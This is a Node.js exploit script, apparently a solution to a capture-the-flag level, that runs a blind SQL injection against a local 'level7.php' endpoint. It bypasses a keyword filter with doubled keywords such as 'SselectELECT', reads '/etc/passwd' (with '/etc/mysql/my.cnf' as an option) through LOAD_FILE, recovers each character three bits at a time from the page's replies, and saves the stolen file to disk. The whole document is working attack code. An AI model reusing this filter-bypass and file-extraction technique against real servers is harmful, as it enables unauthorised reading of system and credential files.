const { error } = require('console');
var http = require('http')
var fs = require('fs')

const URL_BASE = 'http://127.0.0.1:12000/level7.php?id='

let FILE_PATH = '/etc/passwd';
// FILE_PATH = '/etc/mysql/my.cnf'

async function getBits(bits, offset, index) {
    let query = `(SselectELECT%09OCT((SselectELECT%09ASCII((SselectELECT%09SUBSTR((SselectELECT%09Lload_fileOAD_FILE('${FILE_PATH}')),${index})))>>${offset})%26${bits}))`;
    let url = URL_BASE + query;
    // console.log('issuing request: ' + url);

    return new Promise((resolve, reject) =>
    http.get(url, (response) => {
        let status_error;
        if (response.statusCode !== 200) {
            status_error = new Error('Invalid response!');
        }
        if (status_error) {
            response.resume();
            return;
        }
        response.on('error', error => {
            reject(error)
        });

        let rawData = '';
        response.on('data', (chunk) => {rawData += chunk});
        response.on('end', () => {
            if (rawData.includes('DO IT') && !rawData.includes('JUST DO IT')) {
                console.log('DO IT');
                resolve(0)
            }
            else if (rawData.includes('JUST DO IT')) {
                console.log('JUST DO IT');
                resolve(1)
            }
            else if (rawData.includes('DON\'T LET YOUR DREAMS BE DREAMS')) {
                console.log('DON\'T LET YOUR DREAMS BE DREAMS');
                resolve(2);
            }
            else if (rawData.includes('NOTHING IS IMPOSSIBLE')) {
                console.log('NOTHING IS IMPOSSIBLE');
                resolve(3);
            }
            else if (rawData.includes('STOP GIVING UP')) {
                console.log('STOP GIVING UP');
                resolve(4);
            }
            else if (rawData.includes('MAKE YOUR DREAMS COME TRUE')) {
                console.log('MAKE YOUR DREAMS COME TRUE');
                resolve(5);
            }
            else {
                // Bogus for 6/7
                // console.log(rawData);
                resolve('6/7')
            }
        });

    })
    );
}

async function leak_character(index) {
    let char = 0
    for (let i = 2; i >= 0; i--) {
        let bits = await getBits(7, 3 * i, index);
        // Handle ambiguous response
        if (bits === '6/7') {
            let extra = await getBits(1, 3 * i, index);
            if (extra == 1) {
                char |= (7 << (3 * i));
            }
            else {
                char |= (6 << (3 * i));
            }
        }
        else {
            char |= (bits << (3 * i));
        }
    }
    return char;
}

async function main() {
    let data = '';
    let c;
    // SQL SUBSTR indices are 1 based
    let index = 1;
    do {
        c = await leak_character(index);
        index++;
        data += String.fromCharCode(c);
        console.log(c);
    } while (c != 0);

    console.log(data);
    fs.writeFile(`./${FILE_PATH.split('/').at(-1)}`, data, function (err) {
        if (err) throw err;
        console.log(`Saved file to ${FILE_PATH.split('/').at(-1)}`)
    })
}

main()

